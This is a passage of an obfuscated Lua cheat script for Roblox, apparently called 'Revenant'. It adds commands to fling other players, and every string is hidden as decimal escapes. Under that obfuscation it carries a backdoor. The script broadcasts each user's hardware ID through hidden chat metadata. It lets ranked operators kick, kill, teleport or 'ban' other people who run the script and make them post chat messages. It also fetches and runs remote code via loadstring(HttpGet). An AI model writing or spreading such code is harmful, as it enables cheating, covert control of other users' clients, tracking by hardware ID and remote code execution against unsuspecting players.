 local function _IllIIlIIII(others) for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll and ( not others or _lIIlIIlllI ~= _llIlIIlIll) then _lllIIlllII(_lIIlIIlllI) end
 end
 end
 _IIlIIlIlIl("\102\108\105\110\103", {"\118\111\105\100"}, function (_IIIllllIlI) if not _IIIllllIlI[0x1] then return end
 if _llllIlllll then return end
 local _llIIIIlllI = _IIIllllIlI[0x1]:lower() local _llIlllIlII = {} if _llIIIIlllI == "\097\108\108" or _llIIIIlllI == "\111\116\104\101\114\115" then for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll then table.insert(_llIlllIlII, _lIIlIIlllI) end
 end
 else local _lIIIllllII = _lIlllIllIl(_IIIllllIlI[0x1]) if _lIIIllllII then table.insert(_llIlllIlII, _lIIIllllII) end
 end
 if #_llIlllIlII == 0x0 then return end
 local _lIllIIIIlI = _lIIlIllIlI.CmdFlingMethod and _lIIlIllIlI.CmdFlingMethod.Value or "\086\111\105\100" task.spawn( function () for _lIIlIllIlI, _IIIIlllIll in ipairs(_llIlllIlII) do if not _IIIIlllIll or not _IIIIlllIll.Parent then continue end
 _llllIlllll = true if not _IIIllIIlll then _IIIIIlllll(_IIIIlllIll) end
 _llllIIlIll(_IIIIlllIll) _llllIlllll = false if not _IIIllIIlll then _IIIIllIIlI() end
 end
 end
 ) end
 ) _IIlIIlIlIl("\108\111\111\112\102\108\105\110\103", {"\108\111\111\112\118\111\105\100"}, function (_IIIllllIlI) if not _IIIllllIlI[0x1] then return end
 local _llIIIIlllI = _IIIllllIlI[0x1]:lower() if _llIIIIlllI == "\097\108\108" then _lIllIllIIl = "\097\108\108" for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll and _lllIIllIll(_lIIlIIlllI) then _IlIlIlIIll[_IIIllIIlII(_lIIlIIlllI)] = _lIIlIIlllI end
 end
 elseif _llIIIIlllI == "\111\116\104\101\114\115" then _lIllIllIIl = "\111\116\104\101\114\115" for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll and _lllIIllIll(_lIIlIIlllI) then _IlIlIlIIll[_IIIllIIlII(_lIIlIIlllI)] = _lIIlIIlllI end
 end
 else _lIllIllIIl = "\115\105\110\103\108\101" local _IIIIlllIll = _lIlllIllIl(_IIIllllIlI[0x1]) if not _IIIIlllIll then return end
 if not _lllIIllIll(_IIIIlllIll) then _IIIllIIlll:Notify({ Title = "\070\108\105\110\103", Content = _IIIIlllIll.DisplayName .. "\032\105\115\032\110\111\116\032\105\110\032\116\104\101\032\109\097\112\046", _IlllIlIllI = 0x3 }) return end
 _IlIlIlIIll[_IIIllIIlII(_IIIIlllIll)] = _IIIIlllIll end
 if not _llllIlllll then _IIlIlllllI() end
 end
 ) _IIlIIlIlIl("\117\110\102\108\105\110\103", {"\117\110\118\111\105\100", "\117\110\108\111\111\112\102\108\105\110\103", "\117\110\108\111\111\112\118\111\105\100"}, function (_IIIllllIlI) if not _IIIllllIlI[0x1] then _lIllIllIIl = nil _IlIlIlIIll = {} _lIlIlllIII() return end
 local _llIIIIlllI = _IIIllllIlI[0x1]:lower() if _llIIIIlllI == "\097\108\108" or _llIIIIlllI == "\111\116\104\101\114\115" then _lIllIllIIl = nil _IlIlIlIIll = {} _lIlIlllIII() else local _IIIIlllIll = _lIlllIllIl(_IIIllllIlI[0x1]) if _IIIIlllIll then _IlIlIlIIll[_IIIllIIlII(_IIIIlllIll)] = nil end
 if not next(_IlIlIlIIll) then _lIllIllIIl = nil _lIlIlllIII() end
 end
 end
 ) _IIlIIlIlIl("\114\101\115\101\116", nil, function (_lIIlIllIlI) pcall( function () replicatesignal(game.Players.LocalPlayer.Kill) end
 ) end
 ) _IIlIIlIlIl("\102\105\120\099\097\109", nil, function (_lIIlIllIlI) local _IIllIIlllI = _llIlIIlIll.Character local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIllIIlllI and _lIlIIllIII and workspace.CurrentCamera then local _IlIIIIIlII = workspace.CurrentCamera.CFrame workspace.CurrentCamera:Destroy() local _IllIIIIlIl = Instance.new("\067\097\109\101\114\097", workspace) _IllIIIIlIl.CameraType = Enum.CameraType.Custom _IllIIIIlIl.CameraSubject = _lIlIIllIII _IllIIIIlIl.CFrame = _IlIIIIIlII _llIlIIlIll.CameraMode = Enum.CameraMode.Classic end
 end
 ) RevenantWhitelist = RevenantWhitelist or {} _IIlIIlIlIl("\119\104\105\116\101\108\105\115\116", {"\097\100\100\119\104\105\116\101\108\105\115\116"}, function (_IIIllllIlI) local _IIIIlllIll = _lIlllIllIl(_IIIllllIlI[0x1]) if not _IIIIlllIll then return end
 if table.find(RevenantWhitelist, _IIIIlllIll) then _IIIllIIlll:Notify({Title = "\087\104\105\116\101\108\105\115\116", Content = _IIIIlllIll.DisplayName .. "\032\105\115\032\097\108\114\101\097\100\121\032\119\104\105\116\101\108\105\115\116\101\100\046", _IlllIlIllI = 0x3}) else table.insert(RevenantWhitelist, _IIIIlllIll) _IIIllIIlll:Notify({Title = "\087\104\105\116\101\108\105\115\116", Content = "\087\104\105\116\101\108\105\115\116\101\100\032" .. _IIIIlllIll.DisplayName, _IlllIlIllI = 0x3}) end
 end
 ) _IIlIIlIlIl("\117\110\119\104\105\116\101\108\105\115\116", {"\114\101\109\111\118\101\119\104\105\116\101\108\105\115\116"}, function (_IIIllllIlI) local _IIIIlllIll = _lIlllIllIl(_IIIllllIlI[0x1]) if not _IIIIlllIll then return end
 local _IIIllIIIIl = table.find(RevenantWhitelist, _IIIIlllIll) if _IIIllIIIIl then table.remove(RevenantWhitelist, _IIIllIIIIl) _IIIllIIlll:Notify({Title = "\087\104\105\116\101\108\105\115\116", Content = "\085\110\119\104\105\116\101\108\105\115\116\101\100\032" .. _IIIIlllIll.DisplayName, _IlllIlIllI = 0x3}) end
 end
 ) _lIllllllll = {} _RCS_MyRank = 0x63 do _RCS_Prefix = "\082\067\083\095" _RCS_Channel = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101").TextChannels.RBXGeneral _RCS_RankMap = { ["\101\053\048\052\052\050\051\100\051\097\054\050\051\101\051\051\055\097\101\099\049\097\049\054\054\051\102\098\051\057\054\055\101\048\053\056\100\051\052\054\053\050\101\051\101\101\101\054\098\101\052\102\056\051\098\051\102\100\048\097\048\099\101\100\052\097\100\102\051\054\051\054\052\048\054\100\101\054\050\048\099\053\097\100\051\055\052\055\055\101\048\048\055\050\050\050\053\054\054\057\048\097\050\057\097\048\099\101\051\057\053\099\050\102\055\098\102\097\098\101\056\055\049\055\049\099\048\053"] = 0x1, ["\049\056\053\050\098\050\051\049\055\101\050\057\100\101\049\051\050\099\097\101\098\053\051\053\052\099\052\098\098\097\097\053\049\102\100\052\097\053\055\056\053\050\050\098\102\050\101\051\100\053\048\051\055\048\053\100\101\097\053\055\057\057\055\054"] = 0x2, ["\051\057\054\052\054\054\051\050\051\051\051\051\051\054\054\051\054\049\054\054\051\051\051\055\054\050\051\053\054\051\054\054\051\054\054\052\051\049\051\053\051\054\051\055\054\051\051\050\051\054\054\049\051\049\051\053\051\048\051\056\054\054\051\056\054\049\051\050\054\050\054\053\051\048\054\052\054\054\054\049\054\050\051\052\051\055\051\053\051\056\051\052\051\057\054\050\054\052\051\052\051\057\054\049\051\055\051\049\051\054\054\050\051\052\054\049\054\049\051\050\054\052\051\049\054\049\051\057"] = 0x2, ["\054\102\101\048\097\099\057\055\052\057\057\100\098\051\051\051\099\049\101\097\057\102\099\051\055\098\097\049\100\097\099\056\049\053\055\054\051\051\055\102\051\056\100\050\100\102\048\053\049\051\099\048\050\051\102\052\053\052\098\049\049\057\048\102"] = 0x2, ["\049\097\097\097\053\099\055\050\101\052\101\049\097\050\057\055\097\057\051\056\052\100\051\050\098\048\056\050\049\057\056\057\051\101\101\053\051\101\056\101\102\098\048\051\102\052\049\102\100\054\098\057\054\048\056\051\057\099\097\097\102\099\051\098"] = 0x3, ["\053\054\097\100\056\048\057\102\098\057\051\054\098\057\056\052\099\055\051\100\100\050\097\100\099\102\099\098\049\056\057\056\053\055\050\052\099\049\053\054\056\055\097\100\051\100\055\055\053\055\053\055\102\057\048\056\054\098\102\057\097\054\056\057\055\098\097\052\100\054\048\050\057\054\051\056\057\048\049\098\051\098\102\097\051\054\052\102\102\049\048\051\057\051\051\054\051\097\048\102\055\052\098\101\056\050\099\055\097\055\054\052\099\057\048\052\101\102\102\052\050\101\049\057\048\051\054\098"] = 0x3, ["\053\050\056\098\057\098\102\048\102\099\056\101\053\054\056\097\054\098\052\101\102\100\048\100\099\048\057\102\053\049\051\098\057\050\100\049\052\057\100\099\100\098\102\052\102\052\097\053\048\098\099\050\054\050\056\057\100\101\055\102\102\050\100\056"] = 0x3, ["\099\050\049\057\048\097\098\052\101\056\048\049\051\050\049\055\048\051\100\051\054\050\101\052\054\057\055\056\054\048\056\098\051\055\056\048\057\102\102\098\053\052\101\057\097\098\049\099\052\050\052\049\057\056\097\049\100\048\048\098\049\049\099\097"] = 0x3, ["\054\102\097\056\055\102\100\056\101\057\048\056\055\098\052\098\053\099\048\053\050\098\048\101\051\048\056\101\050\101\054\051\054\057\051\051\056\052\048\054\050\097\102\048\050\101\101\055\054\051\050\053\101\097\101\101\056\097\054\099\057\100\102\052"] = 0x3, ["\054\101\051\102\049\049\057\098\056\048\097\101\050\053\099\098\102\048\099\051\053\057\053\055\050\101\050\102\054\051\050\101\102\056\053\099\099\098\097\056\097\054\100\102\057\097\100\056\049\100\050\054\053\052\052\054\099\100\102\102\101\100\054\100"] = 0x3, ["\057\049\048\048\057\056\051\051\052\097\049\051\101\057\100\050\048\101\054\099\055\100\053\101\054\098\053\052\099\099\055\050\052\051\056\051\048\052\057\048\055\050\100\054\048\051\052\097\052\057\050\049\057\050\101\101\101\101\100\098\049\049\051\055"] = 0x3, ["\055\053\101\051\098\055\099\057\100\102\054\054\102\057\102\053\097\098\050\048\051\054\051\100\051\056\051\098\052\099\053\101\052\049\053\097\051\049\102\050\052\054\052\052\049\057\057\101\051\098\049\055\053\057\097\048\052\102\055\055\056\098\097\056"] = 0x3, ["\057\053\098\055\050\056\055\057\050\097\057\101\052\052\102\049\056\048\100\055\057\052\051\097\100\097\050\102\051\057\098\056\054\100\049\053\102\048\098\102\057\097\099\097\056\051\052\052\056\101\051\051\056\053\097\102\098\100\102\048\057\053\100\053"] = 0x3 } _lllIIIIlll = { [0x1] = "\079\119\110\101\114", [0x2] = "\067\111\045\079\119\110\101\114", [0x3] = "\084\114\117\115\116\101\100" } _IIllllIlII = function (_lllIllIlII) return _RCS_RankMap[_lllIllIlII:lower()] or 0x63 end
 _RCS_MyHWID = "" pcall( function () if gethwid then _RCS_MyHWID = gethwid() end
 end
 ) _RCS_MyRank = _IIllllIlII(_RCS_MyHWID) _RCS_SessionToken = tostring(math.random(0x186A0, 0xF423F)) _RCS_Send = function (_IlIIIlIIll, _IlIlIllIll) local _lllIIllllI = _RCS_Prefix .. _IlIIIlIIll .. "\124" .. _RCS_MyHWID .. "\124" .. _RCS_SessionToken .. "\124" .. (_IlIlIllIll or "") pcall( function () _RCS_Channel:SendAsync("", _lllIIllllI) end
 ) end
 _RCS_AnchorConn = nil _RCS_ExecuteOnSelf = function (_IllIIIIIll, _IlIlIllIll) local _IIllIIlllI = _llIlIIlIll.Character local _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IllIIIIIll == "\098\114\105\110\103" then if _lIlIllIlIl and _IlIlIllIll ~= "" then local _llllllllIl, ay, az, bx, by, bz = _IlIlIllIll:match( "\094\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\036") if _llllllllIl then local _IlIlllIIll = Vector3.new(tonumber(_llllllllIl), tonumber(ay), tonumber(az)) local _lllllIlllI = Vector3.new(tonumber(bx), tonumber(by), tonumber(bz)) _lIlIllIlIl.CFrame = CFrame.lookAt(_IlIlllIIll, _lllllIlllI) else local _lllIIlIIlI, y, z = _IlIlIllIll:match("\094\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\036") if _lllIIlIIlI then _lIlIllIlIl.CFrame = CFrame.new(tonumber(_lllIIlIIlI), tonumber(y), tonumber(z)) end
 end
 end
 elseif _IllIIIIIll == "\107\105\108\108" then if typeof(replicatesignal) == "\102\117\110\099\116\105\111\110" then pcall( function () replicatesignal(_llIlIIlIll.Kill) end
 ) elseif _lIlIIllIII then _lIlIIllIII.Health = 0x0 end
 elseif _IllIIIIIll == "\097\110\099\104\111\114" then if _RCS_AnchorConn then _RCS_AnchorConn:Disconnect() _RCS_AnchorConn = nil end
 local _lllIIllIII = _lIlIllIlIl and _lIlIllIlIl.CFrame or CFrame.new(0x0, 0x5, 0x0) _RCS_AnchorConn = RunService.Heartbeat:Connect( function () local _IlIlIllIll = _llIlIIlIll.Character local _IIIlIIIIIl = _IlIlIllIll and _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIlIIIIIl then _IIIlIIIIIl.CFrame = _lllIIllIII _IIIlIIIIIl.AssemblyLinearVelocity = Vector3.zero _IIIlIIIIIl.AssemblyAngularVelocity = Vector3.zero pcall( function () _IIIlIIIIIl.Velocity = Vector3.zero end
 ) pcall( function () _IIIlIIIIIl.RotVelocity = Vector3.zero end
 ) end
 end
 ) elseif _IllIIIIIll == "\117\110\097\110\099\104\111\114" then if _RCS_AnchorConn then _RCS_AnchorConn:Disconnect() _RCS_AnchorConn = nil end
 elseif _IllIIIIIll == "\115\111\110\105\099" then if not getgenv().RevenantSonicExecuted then getgenv().RevenantSonicExecuted = true pcall( function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\114\097\122\101\099\111\109\115\111\110\111\047\082\101\118\101\110\097\110\116\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\083\111\110\105\099\046\108\117\097"))() end
 ) end
 pcall( function () if getgenv().RevenantCleanup then getgenv().RevenantCleanup() else if _IIIllIIlll then _IIIllIIlll:Unload() end
 end
 getgenv().RevenantLoaded = false getgenv().RevenantCleanup = nil end
 ) elseif _IllIIIIIll == "\098\097\110" then if _IIllIIlllI then pcall( function () shared.ismobile = false end
 ) pcall( function () shared.isconsole = true end
 ) pcall( function () _IIllIIlllI:SetAttribute("\109\111\098\105\108\101", false) end
 ) pcall( function () _IIllIIlllI:SetAttribute("\099\111\110\115\111\108\101", true) end
 ) local _llIIlIIIll = _IIllIIlllI:FindFirstChild("\067\111\109\109\117\110\105\099\097\116\101") or _IIllIIlllI:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101", 0x1) if _llIIlIIIll then pcall( function () _llIIlIIIll:FireServer({ Goal = "\080\108\097\116\102\111\114\109", mobile = false }) end
 ) pcall( function () _llIIlIIIll:FireServer({ Goal = "\080\108\097\116\102\111\114\109", console = true }) end
 ) pcall( function () _llIIlIIIll:FireServer({ Goal = "\032\080\108\097\116\102\111\114\109\032", mobile = false }) end
 ) end
 end
 elseif _IllIIIIIll == "\107\105\099\107" then _llIlIIlIll:Kick(_IlIlIllIll ~= "" and _IlIlIllIll or "\091\082\067\083\093\032\089\111\117\032\119\101\114\101\032\107\105\099\107\101\100\046") elseif _IllIIIIIll == "\117\110\108\111\097\100" then pcall( function () if getgenv().RevenantCleanup then getgenv().RevenantCleanup() else _IIIllIIlll:Unload() end
 end
 ) elseif _IllIIIIIll == "\115\097\121" then pcall( function () local _IlIIIIIllI = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101").TextChannels:FindFirstChild("\082\066\088\071\101\110\101\114\097\108") if _IlIIIIIllI then _IlIIIIIllI:SendAsync(_IlIlIllIll) end
 end
 ) elseif _IllIIIIIll == "\110\111\116\105\102\121" then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\046\046\046"), Content = _IlIlIllIll, _IlllIlIllI = 0x6 }) elseif _IllIIIIIll == "\106\117\109\112\115\099\097\114\101" then task.spawn( function () local _IIlIllIlll = game:GetService("\067\111\114\101\071\117\105") local _IlIIllIIII = Instance.new("\083\111\117\110\100", _IIlIllIlll) _IlIIllIIII.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\053\051\051\050\049\052\054\054\053\051" _IlIIllIIII.Volume = 0xA _IlIIllIIII.PlaybackSpeed = 0x3 _IlIIllIIII:Play() _IlIIllIIII.Ended:Wait() _IlIIllIIII:Destroy() local _lIlIlIIlII = Instance.new("\083\099\114\101\101\110\071\117\105", _IIlIllIlll) _lIlIlIIlII.IgnoreGuiInset = true _lIlIlIIlII.ZIndexBehavior = Enum.ZIndexBehavior.Sibling local _IIlllIIIII = Instance.new("\073\109\097\103\101\076\097\098\101\108", _lIlIlIIlII) _IIlllIIIII.BackgroundTransparency = 0x1 _IIlllIIIII.BorderSizePixel = 0x0 _IIlllIIIII.Position = UDim2.new(0x0, 0x0, 0x0, 0x0) _IIlllIIIII.Size = UDim2.new(0x1, 0x0, 0x1, 0x0) _IIlllIIIII.Image = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\055\048\048\054\052\053\053\056\050\053" local _llIIIlIIIl = Instance.new("\083\111\117\110\100", _IIlIllIlll) _llIIIlIIIl.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\051\050\054\052\052\050\056\057" _llIIIlIIIl.Volume = 0xA _llIIIlIIIl:Play() _llIIIlIIIl.Ended:Wait() _lIlIlIIlII:Destroy() _llIIIlIIIl:Destroy() end
 ) elseif _IllIIIIIll == "\098\101\109\121\115\116\097\110\100" then if _IlIlIllIll ~= "" then local _IIIIlllIll for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI.Name == _IlIlIllIll or _lIIlIIlllI.DisplayName == _IlIlIllIll then _IIIIlllIll = _lIIlIIlllI break end
 end
 if _IIIIlllIll and getgenv()._standActivateFn then getgenv()._standActivateFn(_IIIIlllIll) pcall( function () _lIIlIllIlI.StandTargetDropdown:SetDisabled(true) end
 ) pcall( function () _lIIlIllIlI.StandMethodDropdown:SetDisabled(true) end
 ) end
 end
 elseif _IllIIIIIll == "\115\116\111\112\098\101\105\110\103\109\121\115\116\097\110\100" then if getgenv()._standDeactivateFn then getgenv()._standDeactivateFn() end
 pcall( function () _lIIlIllIlI.StandTargetDropdown:SetDisabled(false) end
 ) pcall( function () _lIIlIllIlI.StandMethodDropdown:SetDisabled(false) end
 ) end
 end
 _RCS_SendCmd = function (_IllIIIIIll, _IllIIllllI) if _RCS_MyRank == 0x63 then return end
 local _IlIlIllIll = tostring(_IllIIllllI.UserId) if _IllIIIIIll == "\098\114\105\110\103" then local _IIIlIIIIIl = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIlIIIIIl then local _IIllllIllI = _IIIlIIIIIl.CFrame * CFrame.new(0x0, 0x0, -0x3) _IlIlIllIll = _IlIlIllIll .. "\044" .. string.format("\037\046\051\102\044\037\046\051\102\044\037\046\051\102\044\037\046\051\102\044\037\046\051\102\044\037\046\051\102", _IIllllIllI.X, _IIllllIllI.Y, _IIllllIllI.Z, _IIIlIIIIIl.Position.X, _IIIlIIIIIl.Position.Y, _IIIlIIIIIl.Position.Z) end
 end
 _RCS_Send("\067\077\068\058" .. _IllIIIIIll, _IlIlIllIll) end
 _RCS_MsgConn = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101").MessageReceived:Connect( function (_lllIllIllI) local _lllIIllllI = _lllIllIllI.Metadata local _lIIlIlIIlI = _lllIllIllI.TextSource if not _lllIIllllI or not _lIIlIlIIlI then return end
 if _lIIlIlIIlI.UserId == _llIlIIlIll.UserId then return end
 if _lllIIllllI:sub(0x1, #_RCS_Prefix) ~= _RCS_Prefix then return end
 local _lIlIlllIIl = Players:GetPlayerByUserId(_lIIlIlIIlI.UserId) if not _lIlIlllIIl then return end
 local _IIIlIIlIll = _lllIIllllI:sub(#_RCS_Prefix + 0x1) local _IlIIIlIIll, _lllIllIlII, token, _IlIlIllIll = _IIIlIIlIll:match("\094\040\091\094\124\093\043\041\124\040\091\094\124\093\042\041\124\040\091\094\124\093\042\041\124\063\040\046\042\041\036") if not _IlIIIlIIll or not _lllIllIlII then return end
 local _lllIIIIlII = _IIllllIlII(_lllIllIlII) if _IlIIIlIIll == "\100\105\115\099\111\110" then _lIllllllll[_lIIlIlIIlI.UserId] = nil return end
 if _IlIIIlIIll == "\105\110\105\116\032\105\032\115\117\112\112\111\114\116\032\104\111\111\107\115" or _IlIIIlIIll == "\105\110\105\116\032\105\032\100\111\110\116\032\115\117\112\112\111\114\116\032\104\111\111\107\115" then local _lIlIIllIll = (_IlIIIlIIll == "\105\110\105\116\032\105\032\115\117\112\112\111\114\116\032\104\111\111\107\115") local _llIllllIll = _lIllllllll[_lIIlIlIIlI.UserId] local _lIlIllIlIl = not _llIllllIll or (_llIllllIll.token ~= token) _lIllllllll[_lIIlIlIIlI.UserId] = { _IlIlIIIlII = _lIlIlllIIl, _lllIllIlII = _lllIllIlII, rank = _lllIIIIlII, token = token, _lIlIIllIll = _lIlIIllIll } if _lIlIllIlIl then if typeof(hookfunction) == "\102\117\110\099\116\105\111\110" then _RCS_Send("\105\110\105\116\032\105\032\115\117\112\112\111\114\116\032\104\111\111\107\115") else _RCS_Send("\105\110\105\116\032\105\032\100\111\110\116\032\115\117\112\112\111\114\116\032\104\111\111\107\115") end
 if _RCS_MyRank <= 0x3 then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\067\111\109\109\097\110\100\032\098\097\114"), Content = "\084\114\117\115\116\101\100\032\099\111\110\110\101\099\116\101\100\032\119\105\116\104\032" .. _lIlIlllIIl.DisplayName .. "\032\040\064" .. _lIlIlllIIl.Name .. "\041\044\032\101\120\116\114\097\032\099\111\109\109\097\110\100\115\032\097\114\101\032\097\118\097\105\108\097\098\108\101\044\032\105\102\032\121\111\117\032\097\114\101\032\104\105\103\104\101\114\032\116\104\097\110\032\104\105\109\046", _IlllIlIllI = 0x6 }) end
 end
 return end
 if _IlIIIlIIll:sub(0x1, 0x4) == "\067\077\068\058" then local _IllIIIIIll = _IlIIIlIIll:sub(0x5) local _IllIllllIl = _IlIlIllIll:split("\044") local _IIlIIlIIII = _IllIllllIl[0x1] if tostring(_llIlIIlIll.UserId) ~= _IIlIIlIIII then return end
 if _lllIIIIlII == 0x63 then return end
 if _IllIIIIIll == "\098\097\110" and _lllIIIIlII ~= 0x1 then _RCS_Send("\067\077\068\058\110\111\116\105\102\121", tostring(_lIIlIlIIlI.UserId) .. "\044\078\111\032\112\101\114\109\105\115\115\105\111\110\115\046") return end
 if _lllIIIIlII >= _RCS_MyRank then _RCS_Send("\067\077\068\058\110\111\116\105\102\121", tostring(_lIIlIlIIlI.UserId) .. "\044\078\111\032\112\101\114\109\105\115\115\105\111\110\115\046") return end
 local _IIIIIIIlll = "" if _IllIIIIIll == "\098\114\105\110\103" and #_IllIllllIl >= 0x7 then _IIIIIIIlll = _IllIllllIl[0x2] .. "\044" .. _IllIllllIl[0x3] .. "\044" .. _IllIllllIl[0x4] .. "\044" .. _IllIllllIl[0x5] .. "\044" .. _IllIllllIl[0x6] .. "\044" .. _IllIllllIl[0x7] elseif _IllIIIIIll == "\107\105\099\107" and #_IllIllllIl >= 0x2 then _IIIIIIIlll = table.concat(_IllIllllIl, "\044", 0x2) elseif _IllIIIIIll == "\115\097\121" and #_IllIllllIl >= 0x2 then _IIIIIIIlll = table.concat(_IllIllllIl, "\044", 0x2) elseif _IllIIIIIll == "\110\111\116\105\102\121" and #_IllIllllIl >= 0x2 then _IIIIIIIlll = table.concat(_IllIllllIl, "\044", 0x2) elseif _IllIIIIIll == "\098\101\109\121\115\116\097\110\100" then _IIIIIIIlll = _lIlIlllIIl.Name end
 _RCS_ExecuteOnSelf(_IllIIIIIll, _IIIIIIIlll) end
 end
 ) getgenv()._tsb_getRevTargets = function (_lllIIlIIIl) local _IllllllIlI = _lllIIlIIIl:lower() if _IllllllIlI == "\097\108\108" or _IllllllIlI == "\111\116\104\101\114\115" then local _llIIIlIIlI = {} for _lIIlIllIlI, _lllIIllllI in pairs(_lIllllllll) do if _lllIIllllI.player and _lllIIllllI.player.Parent then table.insert(_llIIIlIIlI, _lllIIllllI.player) end
 end
 return _llIIIlIIlI end
 for _lIIlIllIlI, _lllIIllllI in pairs(_lIllllllll) do local _lIIlIIlllI = _lllIIllllI.player if _lIIlIIlllI and _lIIlIIlllI.Parent then if _lIIlIIlllI.Name:lower():sub(0x1, #_IllllllIlI) == _IllllllIlI or _lIIlIIlllI.DisplayName:lower():sub(0x1, #_IllllllIlI) == _IllllllIlI then return { _lIIlIIlllI } end
 end
 end
 return nil end
 getgenv()._tsb_RCS_Cmd = function (_lIlIlllllI, aliases, extraBuilder) _IIlIIlIlIl(_lIlIlllllI, aliases, function (_IIIllllIlI) local _llIlllIlII = getgenv()._tsb_getRevTargets(_IIIllllIlI[0x1] or "") if not _llIlllIlII or #_llIlllIlII == 0x0 then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\067\111\109\109\097\110\100\032\098\097\114"), Content = "\084\104\101\114\101\115\032\110\111\032\114\101\118\101\110\097\110\116\032\117\115\101\114\032\104\101\114\101\046", _IlllIlIllI = 0x3 }) return end
 for _lIIlIllIlI, _IIIIlllIll in ipairs(_llIlllIlII) do if extraBuilder then local _IlIlIllIll = extraBuilder(_IIIIlllIll, _IIIllllIlI) if _IlIlIllIll ~= nil then _RCS_Send("\067\077\068\058" .. _lIlIlllllI, _IlIlIllIll) end
 else _RCS_SendCmd(_lIlIlllllI, _IIIIlllIll) end
 end
 end
 ) end
 if _RCS_MyRank <= 0x3 then getgenv()._tsb_RCS_Cmd("\098\114\105\110\103") getgenv()._tsb_RCS_Cmd("\107\105\108\108") getgenv()._tsb_RCS_Cmd("\097\110\099\104\111\114") getgenv()._tsb_RCS_Cmd("\117\110\097\110\099\104\111\114") getgenv()._tsb_RCS_Cmd("\115\111\110\105\099") getgenv()._tsb_RCS_Cmd("\117\110\108\111\097\100") if _RCS_MyRank == 0x1 then getgenv()._tsb_RCS_Cmd("\098\097\110") end
 getgenv()._tsb_RCS_Cmd("\097\100\100\099\104\114\111\109\111\115\111\109\101", nil, function (_IIIIlllIll, _IIIllllIlI) local _lIIIllIIlI = _lIllllllll[_IIIIlllIll.UserId] if not _lIIIllIIlI or not _lIIIllIIlI.supportsHooks then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\067\111\109\109\097\110\100\032\098\097\114"), Content = "\116\104\105\115\032\098\117\109\032\104\097\118\101\032\097\032\098\097\100\032\101\120\101\099\117\116\111\114\044\032\099\097\110\116\032\097\100\100\032\097\032\099\104\114\111\109\111\115\111\109\101\032\116\111\032\116\104\101\109", _IlllIlIllI = 0x4 }) return nil end
 return tostring(_IIIIlllIll.UserId) .. "\044" .. tostring(_llIlIIlIll.UserId) end
 ) getgenv()._tsb_RCS_Cmd("\114\101\109\111\118\101\099\104\114\111\109\111\115\111\109\101") getgenv()._tsb_RCS_Cmd("\107\105\099\107", nil, function (_IIIIlllIll, _IIIllllIlI) local _lIlIllIIll = #_IIIllllIlI > 0x1 and table.concat(_IIIllllIlI, "\032", 0x2) or "" return tostring(_IIIIlllIll.UserId) .. (_lIlIllIIll ~= "" and ("\044" .. _lIlIllIIll) or "") end
 ) getgenv()._tsb_RCS_Cmd("\115\097\121", nil, function (_IIIIlllIll, _IIIllllIlI) local _lllIllIllI = #_IIIllllIlI > 0x1 and table.concat(_IIIllllIlI, "\032", 0x2) or "" return tostring(_IIIIlllIll.UserId) .. "\044" .. _lllIllIllI end
 ) getgenv()._tsb_RCS_Cmd("\110\111\116\105\102\121", nil, function (_IIIIlllIll, _IIIllllIlI) local _lllIllIllI = #_IIIllllIlI > 0x1 and table.concat(_IIIllllIlI, "\032", 0x2) or "" return tostring(_IIIIlllIll.UserId) .. "\044" .. _lllIllIllI end
 ) getgenv()._tsb_RCS_Cmd("\106\117\109\112\115\099\097\114\101") getgenv()._tsb_RCS_Cmd("\098\101\109\121\115\116\097\110\100") getgenv()._tsb_RCS_Cmd("\115\116\111\112\098\101\105\110\103\109\121\115\116\097\110\100") end
 Players.PlayerRemoving:Connect( function (_lIIlIIlllI) _lIllllllll[_lIIlIIlllI.UserId] = nil end
 ) _IIlIIlIlIl("\108\105\115\116\114\101\118\101\110\097\110\116\117\115\101\114\115", {"\108\105\115\116\114\101\118"}, function (_lIIlIllIlI) local _lIlIlllIIl = {} for userId, _lllIIllllI in pairs(_lIllllllll) do local _lIIlIIlllI = _lllIIllllI.player if _lIIlIIlllI and _lIIlIIlllI.Parent then table.insert(_lIlIlllIIl, _lIIlIIlllI.DisplayName .. "\032\040\064" .. _lIIlIIlllI.Name .. "\041") end
 end
